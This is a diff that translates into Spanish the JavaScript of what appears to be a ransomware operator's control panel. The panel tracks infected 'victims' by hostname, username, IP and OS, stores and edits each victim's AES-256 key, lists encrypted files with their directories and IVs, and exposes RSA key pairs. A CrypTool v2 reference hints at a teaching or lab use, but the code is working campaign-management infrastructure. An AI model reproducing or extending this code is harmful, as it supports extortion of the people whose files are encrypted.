@@ -1,5 +1,5 @@
 // ===============================
-// DATABASE PAGE LOGIC
+// LOGICA DE LA PAGINA DE BASE DE DATOS
 // ===============================
 
 let currentTab = 'victims';
@@ -12,39 +12,39 @@ let sortColumn = null;
 let sortDirection = 'desc';
 
 document.addEventListener('DOMContentLoaded', () => {
-  console.log('Database page loaded');
+  console.log('Pagina de base de datos cargada');
 
-  // Tab switching
+  // Cambio de pestanas
   document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.addEventListener('click', () => {
       document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
       btn.classList.add('active');
       currentTab = btn.dataset.tab;
-      sortColumn = null; // Reset sort when changing tabs
-      renderTable();
+      sortColumn = null; // Reiniciar orden al cambiar pestanas
+      renderizarTabla();
     });
   });
 
-  // Filter input
-  document.getElementById('filterInput').addEventListener('input', renderTable);
+  // Filtro de busqueda
+  document.getElementById('filterInput').addEventListener('input', renderizarTabla);
 
-  // Initial load
-  refreshData();
+  // Carga inicial
+  refrescarDatos();
 
-  // Auto-refresh every 30 seconds
-  setInterval(refreshData, 30000);
+  // Auto-refrescar cada 30 segundos
+  setInterval(refrescarDatos, 30000);
 });
 
-async function refreshData() {
+async function refrescarDatos() {
   try {
-    // Load stats
+    // Cargar estadisticas
     const statsRes = await fetch('/api/db/stats');
     const stats = await statsRes.json();
     document.getElementById('statVictims').textContent = stats.victims || 0;
     document.getElementById('statKeys').textContent = stats.keys || 0;
     document.getElementById('statEncrypted').textContent = stats.encrypted || 0;
 
-    // Load all data
+    // Cargar todos los datos
     const [victimsRes, keysRes, encryptedRes] = await Promise.all([
       fetch('/api/db/victims'),
       fetch('/api/db/keys'),
@@ -59,30 +59,30 @@ async function refreshData() {
     allData.keys = keysData.data || [];
     allData.encrypted = encryptedData.data || [];
 
-    // Load RSA keys
+    // Cargar claves RSA
     try {
       const rsaRes = await fetch('/api/rsa-keys');
       const rsaData = await rsaRes.json();
       allData.rsa = rsaData;
     } catch (e) {
-      console.log('Error loading RSA keys:', e);
+      console.log('Error cargando claves RSA:', e);
       allData.rsa = {};
     }
 
-    renderTable();
+    renderizarTabla();
   } catch (e) {
-    console.error('Error loading data:', e);
+    console.error('Error cargando datos:', e);
   }
 }
 
-function sortData(data, column) {
+function ordenarDatos(data, column) {
   if (!column) return data;
 
   return [...data].sort((a, b) => {
     let valA = a[column] || '';
     let valB = b[column] || '';
 
-    // Handle dates
+    // Manejar fechas
     if (column === 'created_at') {
       valA = new Date(valA).getTime();
       valB = new Date(valB).getTime();
@@ -99,23 +99,23 @@ function sortData(data, column) {
   });
 }
 
-function handleSort(column) {
+function manejarOrden(column) {
   if (sortColumn === column) {
     sortDirection = sortDirection === 'asc' ? 'desc' : 'asc';
   } else {
     sortColumn = column;
     sortDirection = 'desc';
   }
-  renderTable();
+  renderizarTabla();
 }
 
-function renderTable() {
+function renderizarTabla() {
   const container = document.getElementById('tableContainer');
   const filter = document.getElementById('filterInput').value.toLowerCase();
 
   let data = allData[currentTab] || [];
 
-  // Apply filter
+  // Aplicar filtro
   if (filter) {
     data = data.filter(row => {
       return Object.values(row).some(val =>
@@ -124,8 +124,8 @@ function renderTable() {
     });
   }
 
-  // Apply sorting
-  data = sortData(data, sortColumn);
+  // Aplicar ordenamiento
+  data = ordenarDatos(data, sortColumn);
 
   if (data.length === 0) {
     container.innerHTML = '<div class="no-data"><i class="ph ph-database" style="font-size:48px;"></i><p>No hay datos disponibles</p></div>';
@@ -135,20 +135,20 @@ function renderTable() {
   let html = '';
 
   if (currentTab === 'victims') {
-    html = renderVictimsTable(data);
+    html = renderizarTablaVictimas(data);
   } else if (currentTab === 'keys') {
-    html = renderKeysTable(data);
+    html = renderizarTablaClaves(data);
   } else if (currentTab === 'encrypted') {
-    html = renderEncryptedTable(data);
+    html = renderizarTablaCifrados(data);
   } else if (currentTab === 'rsa') {
-    html = renderRSATab(allData.rsa);
+    html = renderizarPestanaRSA(allData.rsa);
   }
 
   container.innerHTML = html;
 }
 
-function renderRSATab(rsaData) {
-  console.log('Rendering RSA Tab');
+function renderizarPestanaRSA(rsaData) {
+  console.log('Renderizando pestana RSA');
   if (!rsaData || !rsaData.publicKey) return '<div class="no-data"><p>No hay claves RSA disponibles</p></div>';
 
   return `
@@ -180,26 +180,26 @@ function renderRSATab(rsaData) {
   `;
 }
 
-function getSortIcon(column) {
+function obtenerIconoOrden(column) {
   if (sortColumn !== column) return '<i class="ph ph-caret-up-down" style="opacity:0.3;"></i>';
   return sortDirection === 'asc'
     ? '<i class="ph ph-caret-up" style="color:var(--primary);"></i>'
     : '<i class="ph ph-caret-down" style="color:var(--primary);"></i>';
 }
 
-function renderVictimsTable(data) {
+function renderizarTablaVictimas(data) {
   return `
     <table class="data-table">
       <thead>
         <tr>
-          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
-          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
-          <th onclick="handleSort('username')" style="cursor:pointer;">Usuario ${getSortIcon('username')}</th>
-          <th onclick="handleSort('ip')" style="cursor:pointer;">IP ${getSortIcon('ip')}</th>
-          <th onclick="handleSort('platform')" style="cursor:pointer;">SO ${getSortIcon('platform')}</th>
-          <th onclick="handleSort('arch')" style="cursor:pointer;">Arch ${getSortIcon('arch')}</th>
-          <th onclick="handleSort('status')" style="cursor:pointer;">Estado ${getSortIcon('status')}</th>
-          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
+          <th onclick="manejarOrden('uuid')" style="cursor:pointer;">UUID ${obtenerIconoOrden('uuid')}</th>
+          <th onclick="manejarOrden('hostname')" style="cursor:pointer;">Hostname ${obtenerIconoOrden('hostname')}</th>
+          <th onclick="manejarOrden('username')" style="cursor:pointer;">Usuario ${obtenerIconoOrden('username')}</th>
+          <th onclick="manejarOrden('ip')" style="cursor:pointer;">IP ${obtenerIconoOrden('ip')}</th>
+          <th onclick="manejarOrden('platform')" style="cursor:pointer;">SO ${obtenerIconoOrden('platform')}</th>
+          <th onclick="manejarOrden('arch')" style="cursor:pointer;">Arch ${obtenerIconoOrden('arch')}</th>
+          <th onclick="manejarOrden('status')" style="cursor:pointer;">Estado ${obtenerIconoOrden('status')}</th>
+          <th onclick="manejarOrden('created_at')" style="cursor:pointer;">Fecha ${obtenerIconoOrden('created_at')}</th>
           <th>Acciones</th>
         </tr>
       </thead>
@@ -210,16 +210,16 @@ function renderVictimsTable(data) {
             <td><strong>${row.hostname || '-'}</strong></td>
             <td>${row.username || '-'}</td>
             <td>${row.ip || '-'}</td>
-            <td>${formatPlatform(row.platform)}</td>
+            <td>${formatearPlataforma(row.platform)}</td>
             <td>${row.arch || '-'}</td>
             <td class="${row.status === 'connected' ? 'status-connected' : 'status-disconnected'}">${row.status || '-'}</td>
-            <td>${formatDate(row.created_at)}</td>
+            <td>${formatearFecha(row.created_at)}</td>
             <td>
               <div class="action-buttons">
-                <button onclick="copyToClipboard('${row.uuid}')" class="copy-btn" title="Copiar UUID">
+                <button onclick="copiarAlPortapapeles('${row.uuid}')" class="copy-btn" title="Copiar UUID">
                   <i class="ph ph-copy"></i>
                 </button>
-                <button class="action-btn delete" onclick="deleteVictim('${row.uuid}', '${row.hostname}')" title="Eliminar">
+                <button class="action-btn delete" onclick="eliminarVictima('${row.uuid}', '${row.hostname}')" title="Eliminar">
                   <i class="ph ph-trash"></i>
                 </button>
               </div>
@@ -231,15 +231,15 @@ function renderVictimsTable(data) {
   `;
 }
 
-function renderKeysTable(data) {
+function renderizarTablaClaves(data) {
   return `
     <table class="data-table">
       <thead>
         <tr>
-          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
-          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
-          <th onclick="handleSort('aes_key')" style="cursor:pointer;">Clave AES-256 ${getSortIcon('aes_key')}</th>
-          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
+          <th onclick="manejarOrden('uuid')" style="cursor:pointer;">UUID ${obtenerIconoOrden('uuid')}</th>
+          <th onclick="manejarOrden('hostname')" style="cursor:pointer;">Hostname ${obtenerIconoOrden('hostname')}</th>
+          <th onclick="manejarOrden('aes_key')" style="cursor:pointer;">Clave AES-256 ${obtenerIconoOrden('aes_key')}</th>
+          <th onclick="manejarOrden('created_at')" style="cursor:pointer;">Fecha ${obtenerIconoOrden('created_at')}</th>
           <th>Acciones</th>
         </tr>
       </thead>
@@ -253,16 +253,16 @@ function renderKeysTable(data) {
                 <span style="overflow:hidden; text-overflow:ellipsis;">${row.aes_key || '-'}</span>
               </div>
             </td>
-            <td>${formatDate(row.created_at)}</td>
+            <td>${formatearFecha(row.created_at)}</td>
             <td>
               <div class="action-buttons">
-                <button onclick="copyToClipboard('${row.aes_key}')" class="copy-btn" title="Copiar clave AES">
+                <button onclick="copiarAlPortapapeles('${row.aes_key}')" class="copy-btn" title="Copiar clave AES">
                   <i class="ph ph-copy"></i>
                 </button>
-                <button class="action-btn edit" onclick="editKey('${row.uuid}', '${row.aes_key}')" title="Editar">
+                <button class="action-btn edit" onclick="editarClave('${row.uuid}', '${row.aes_key}')" title="Editar">
                   <i class="ph ph-pencil-simple"></i>
                 </button>
-                <button class="action-btn delete" onclick="deleteKey('${row.uuid}')" title="Eliminar">
+                <button class="action-btn delete" onclick="eliminarClave('${row.uuid}')" title="Eliminar">
                   <i class="ph ph-trash"></i>
                 </button>
               </div>
@@ -274,18 +274,18 @@ function renderKeysTable(data) {
   `;
 }
 
-function renderEncryptedTable(data) {
+function renderizarTablaCifrados(data) {
   return `
     <table class="data-table">
       <thead>
         <tr>
-          <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
-          <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
-          <th onclick="handleSort('file_name')" style="cursor:pointer;">Archivo ${getSortIcon('file_name')}</th>
-          <th onclick="handleSort('original_name')" style="cursor:pointer;">Original ${getSortIcon('original_name')}</th>
-          <th onclick="handleSort('directory')" style="cursor:pointer;">Directorio ${getSortIcon('directory')}</th>
-          <th onclick="handleSort('iv')" style="cursor:pointer;">IV ${getSortIcon('iv')}</th>
-          <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
+          <th onclick="manejarOrden('uuid')" style="cursor:pointer;">UUID ${obtenerIconoOrden('uuid')}</th>
+          <th onclick="manejarOrden('hostname')" style="cursor:pointer;">Hostname ${obtenerIconoOrden('hostname')}</th>
+          <th onclick="manejarOrden('file_name')" style="cursor:pointer;">Archivo ${obtenerIconoOrden('file_name')}</th>
+          <th onclick="manejarOrden('original_name')" style="cursor:pointer;">Original ${obtenerIconoOrden('original_name')}</th>
+          <th onclick="manejarOrden('directory')" style="cursor:pointer;">Directorio ${obtenerIconoOrden('directory')}</th>
+          <th onclick="manejarOrden('iv')" style="cursor:pointer;">IV ${obtenerIconoOrden('iv')}</th>
+          <th onclick="manejarOrden('created_at')" style="cursor:pointer;">Fecha ${obtenerIconoOrden('created_at')}</th>
           <th>Acciones</th>
         </tr>
       </thead>
@@ -298,10 +298,10 @@ function renderEncryptedTable(data) {
             <td>${row.original_name || '-'}</td>
             <td title="${row.directory || ''}" style="max-width:180px; overflow:hidden; text-overflow:ellipsis;">${truncate(row.directory, 30)}</td>
             <td class="mono" title="${row.iv || ''}">${truncate(row.iv, 16)}</td>
-            <td>${formatDate(row.created_at)}</td>
+            <td>${formatearFecha(row.created_at)}</td>
             <td>
               <div class="action-buttons">
-                <button onclick="copyToClipboard('${row.iv}')" class="copy-btn" title="Copiar IV">
+                <button onclick="copiarAlPortapapeles('${row.iv}')" class="copy-btn" title="Copiar IV">
                   <i class="ph ph-copy"></i>
                 </button>
                 <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
@@ -319,13 +319,13 @@ function renderEncryptedTable(data) {
   `;
 }
 
-function formatDate(dateStr) {
+function formatearFecha(dateStr) {
   if (!dateStr) return '-';
   const d = new Date(dateStr);
   return d.toLocaleDateString('es-ES') + ' ' + d.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
 }
 
-function formatPlatform(platform) {
+function formatearPlataforma(platform) {
   if (!platform) return '-';
 
   // Si ya es un string descriptivo (ej: 'Windows 10'), devolverlo tal cual
@@ -343,7 +343,7 @@ function formatPlatform(platform) {
 }
 
 
-function downloadKey(filename, b64Content) {
+function descargarClave(filename, b64Content) {
   try {
     const binaryString = window.atob(b64Content);
     const bytes = new Uint8Array(binaryString.length);
@@ -358,7 +358,7 @@ function downloadKey(filename, b64Content) {
     link.click();
     document.body.removeChild(link);
   } catch (e) {
-    console.error('Download error:', e);
+    console.error('Error de descarga:', e);
     alert('Error al descargar clave');
   }
 }
@@ -369,21 +369,21 @@ function truncate(str, len) {
   return str.length > len ? str.substring(0, len) + '...' : str;
 }
 
-function copyToClipboard(text) {
+function copiarAlPortapapeles(text) {
   navigator.clipboard.writeText(text).then(() => {
-    // No alert for individual copies to avoid popup spam
+    // Sin alerta para copias individuales
   }).catch(err => {
     console.error('Error al copiar:', err);
   });
 }
 
 // ================================
-// Edit and Delete Key Functions
+// Funciones de Editar y Eliminar Claves
 // ================================
 
-async function editKey(uuid, currentKey) {
+async function editarClave(uuid, currentKey) {
   const newKey = prompt('Editar clave AES (64 caracteres hex):', currentKey);
-  if (newKey === null) return; // Cancelled
+  if (newKey === null) return; // Cancelado
 
   if (newKey.length !== 64) {
     alert('La clave AES debe tener 64 caracteres hexadecimales');
@@ -399,18 +399,18 @@ async function editKey(uuid, currentKey) {
 
     if (response.ok) {
       alert('Clave actualizada correctamente');
-      refreshData();
+      refrescarDatos();
     } else {
       const error = await response.json();
       alert('Error al actualizar: ' + (error.message || 'Error desconocido'));
     }
   } catch (err) {
-    console.error('Error updating key:', err);
-    alert('Error de conexión al actualizar');
+    console.error('Error actualizando clave:', err);
+    alert('Error de conexion al actualizar');
   }
 }
 
-async function deleteKey(uuid) {
+async function eliminarClave(uuid) {
   if (!confirm('¿Estás seguro de eliminar esta clave? Esta acción no se puede deshacer.')) {
     return;
   }
@@ -424,18 +424,18 @@ async function deleteKey(uuid) {
 
     if (response.ok) {
       alert('Clave eliminada correctamente');
-      refreshData();
+      refrescarDatos();
     } else {
       const error = await response.json();
       alert('Error al eliminar: ' + (error.message || 'Error desconocido'));
     }
   } catch (err) {
-    console.error('Error deleting key:', err);
-    alert('Error de conexión al eliminar');
+    console.error('Error eliminando clave:', err);
+    alert('Error de conexion al eliminar');
   }
 }
 
-async function deleteVictim(uuid, hostname) {
+async function eliminarVictima(uuid, hostname) {
   if (!confirm(`¿Estás seguro de eliminar la víctima ${hostname || uuid}? Esto también eliminará su clave y archivos cifrados registrados.`)) {
     return;
   }
@@ -448,23 +448,23 @@ async function deleteVictim(uuid, hostname) {
     });
 
     if (response.ok) {
-      alert('Víctima eliminada correctamente');
-      refreshData();
+      alert('Victima eliminada correctamente');
+      refrescarDatos();
     } else {
       const error = await response.json();
       alert('Error al eliminar: ' + (error.message || 'Error desconocido'));
     }
   } catch (err) {
-    console.error('Error deleting victim:', err);
-    alert('Error de conexión al eliminar');
+    console.error('Error eliminando victima:', err);
+    alert('Error de conexion al eliminar');
   }
 }
 
 // ================================
-// RSA Parameter Extraction for CrypTool v2
+// Extraccion de Parametros RSA para CrypTool v2
 // ================================
 
-async function extractRSAParams() {
+async function extraerParametrosRSA() {
   try {
     const publicPem = document.getElementById('rsa-public-pem')?.textContent || '';
     const privatePem = document.getElementById('rsa-private-pem')?.textContent || '';
@@ -474,15 +474,15 @@ async function extractRSAParams() {
       return;
     }
 
-    // Parse public key
-    const publicKey = await importRSAPublicKey(publicPem);
+    // Parsear clave publica
+    const publicKey = await importarClavePublicaRSA(publicPem);
     const exportedPublic = await crypto.subtle.exportKey('jwk', publicKey);
 
-    // Extract N and e from public key
-    const n = base64UrlToHex(exportedPublic.n);
-    const e = base64UrlToHex(exportedPublic.e);
-    const nDecimal = base64UrlToBigInt(exportedPublic.n).toString();
-    const eDecimal = base64UrlToBigInt(exportedPublic.e).toString();
+    // Extraer N y e de la clave publica
+    const n = base64UrlAHex(exportedPublic.n);
+    const e = base64UrlAHex(exportedPublic.e);
+    const nDecimal = base64UrlABigInt(exportedPublic.n).toString();
+    const eDecimal = base64UrlABigInt(exportedPublic.e).toString();
 
     // Update UI
     document.getElementById('rsa-n-value').textContent = n;
@@ -490,32 +490,32 @@ async function extractRSAParams() {
     document.getElementById('rsa-e-value').textContent = eDecimal;
     document.getElementById('rsa-e-hex').textContent = `Hex: ${e}`;
 
-    // Try to parse private key for d
+    // Intentar parsear clave privada para d
     if (privatePem) {
       try {
-        const privateKey = await importRSAPrivateKey(privatePem);
+        const privateKey = await importarClavePrivadaRSA(privatePem);
         const exportedPrivate = await crypto.subtle.exportKey('jwk', privateKey);
 
-        const d = base64UrlToHex(exportedPrivate.d);
-        const dDecimal = base64UrlToBigInt(exportedPrivate.d).toString();
+        const d = base64UrlAHex(exportedPrivate.d);
+        const dDecimal = base64UrlABigInt(exportedPrivate.d).toString();
 
         document.getElementById('rsa-d-value').textContent = d;
         document.getElementById('rsa-d-decimal').textContent = dDecimal;
       } catch (privErr) {
-        console.log('Could not extract d from private key:', privErr);
+        console.log('No se pudo extraer d de clave privada:', privErr);
         document.getElementById('rsa-d-value').textContent = 'Error al extraer';
       }
     }
 
-    console.log('RSA Parameters extracted successfully');
+    console.log('Parametros RSA extraidos exitosamente');
 
   } catch (err) {
-    console.error('Error extracting RSA params:', err);
-    alert('Error al extraer parámetros: ' + err.message);
+    console.error('Error extrayendo parametros RSA:', err);
+    alert('Error al extraer parametros: ' + err.message);
   }
 }
 
-async function importRSAPublicKey(pem) {
+async function importarClavePublicaRSA(pem) {
   const pemContents = pem
     .replace(/-----BEGIN PUBLIC KEY-----/, '')
     .replace(/-----END PUBLIC KEY-----/, '')
@@ -532,7 +532,7 @@ async function importRSAPublicKey(pem) {
   );
 }
 
-async function importRSAPrivateKey(pem) {
+async function importarClavePrivadaRSA(pem) {
   const pemContents = pem
     .replace(/-----BEGIN PRIVATE KEY-----/, '')
     .replace(/-----END PRIVATE KEY-----/, '')
@@ -551,12 +551,12 @@ async function importRSAPrivateKey(pem) {
   );
 }
 
-function base64UrlToHex(base64url) {
-  // Convert base64url to base64
+function base64UrlAHex(base64url) {
+  // Convertir base64url a base64
   let base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
   while (base64.length % 4) base64 += '=';
 
-  // Decode and convert to hex
+  // Decodificar y convertir a hex
   const binary = atob(base64);
   let hex = '';
   for (let i = 0; i < binary.length; i++) {
@@ -565,13 +565,13 @@ function base64UrlToHex(base64url) {
   return hex;
 }
 
-function base64UrlToBigInt(base64url) {
-  const hex = base64UrlToHex(base64url);
+function base64UrlABigInt(base64url) {
+  const hex = base64UrlAHex(base64url);
   return BigInt('0x' + hex);
 }
 
-// Encrypt AES key with RSA for verification
-async function encryptAESWithRSA() {
+// Cifrar clave AES con RSA para verificacion
+async function cifrarAESConRSA() {
   try {
     const aesKeyHex = document.getElementById('aes-key-input')?.value?.trim();
     const publicPem = document.getElementById('rsa-public-pem')?.textContent || '';
@@ -591,35 +591,35 @@ async function encryptAESWithRSA() {
       return;
     }
 
-    // Convert hex to bytes
+    // Convertir hex a bytes
     const aesKeyBytes = new Uint8Array(aesKeyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
 
-    // Import public key
-    const publicKey = await importRSAPublicKey(publicPem);
+    // Importar clave publica
+    const publicKey = await importarClavePublicaRSA(publicPem);
 
-    // Encrypt with RSA-OAEP
+    // Cifrar con RSA-OAEP
     const encrypted = await crypto.subtle.encrypt(
       { name: 'RSA-OAEP' },
       publicKey,
       aesKeyBytes
     );
 
-    // Convert to base64
+    // Convertir a base64
     const encryptedBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
 
-    // Display result
+    // Mostrar resultado
     document.getElementById('rsa-encrypt-result').textContent = encryptedBase64;
 
-    console.log('AES key encrypted successfully');
+    console.log('Clave AES cifrada exitosamente');
 
   } catch (err) {
-    console.error('Error encrypting AES key:', err);
+    console.error('Error cifrando clave AES:', err);
     document.getElementById('rsa-encrypt-result').textContent = 'Error: ' + err.message;
   }
 }
 
-// Decrypt AES key with RSA private key for verification
-async function decryptAESWithRSA() {
+// Descifrar clave AES con clave privada RSA para verificacion
+async function descifrarAESConRSA() {
   try {
     const encryptedBase64 = document.getElementById('encrypted-aes-input')?.value?.trim();
     const privatePem = document.getElementById('rsa-private-pem')?.textContent || '';
@@ -634,43 +634,43 @@ async function decryptAESWithRSA() {
       return;
     }
 
-    // Convert base64 to bytes
+    // Convertir base64 a bytes
     const encryptedBytes = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));
 
-    // Import private key
-    const privateKey = await importRSAPrivateKey(privatePem);
+    // Importar clave privada
+    const privateKey = await importarClavePrivadaRSA(privatePem);
 
-    // Decrypt with RSA-OAEP
+    // Descifrar con RSA-OAEP
     const decrypted = await crypto.subtle.decrypt(
       { name: 'RSA-OAEP' },
       privateKey,
       encryptedBytes
     );
 
-    // Convert to hex
+    // Convertir a hex
     const decryptedHex = Array.from(new Uint8Array(decrypted))
       .map(b => b.toString(16).padStart(2, '0'))
       .join('');
 
-    // Display result
+    // Mostrar resultado
     document.getElementById('rsa-decrypt-result').textContent = decryptedHex;
 
-    console.log('AES key decrypted successfully');
+    console.log('Clave AES descifrada exitosamente');
 
   } catch (err) {
-    console.error('Error decrypting AES key:', err);
+    console.error('Error descifrando clave AES:', err);
     document.getElementById('rsa-decrypt-result').textContent = 'Error: ' + err.message;
   }
 }
 
-// Global functions for onclick handlers
-window.refreshData = refreshData;
-window.handleSort = handleSort;
-window.copyToClipboard = copyToClipboard;
-window.extractRSAParams = extractRSAParams;
-window.downloadKey = downloadKey;
-window.encryptAESWithRSA = encryptAESWithRSA;
-window.decryptAESWithRSA = decryptAESWithRSA;
-window.editKey = editKey;
-window.deleteKey = deleteKey;
-window.deleteVictim = deleteVictim;
+// Funciones globales para handlers onclick
+window.refrescarDatos = refrescarDatos;
+window.manejarOrden = manejarOrden;
+window.copiarAlPortapapeles = copiarAlPortapapeles;
+window.extraerParametrosRSA = extraerParametrosRSA;
+window.descargarClave = descargarClave;
+window.cifrarAESConRSA = cifrarAESConRSA;
+window.descifrarAESConRSA = descifrarAESConRSA;
+window.editarClave = editarClave;
+window.eliminarClave = eliminarClave;
+window.eliminarVictima = eliminarVictima;
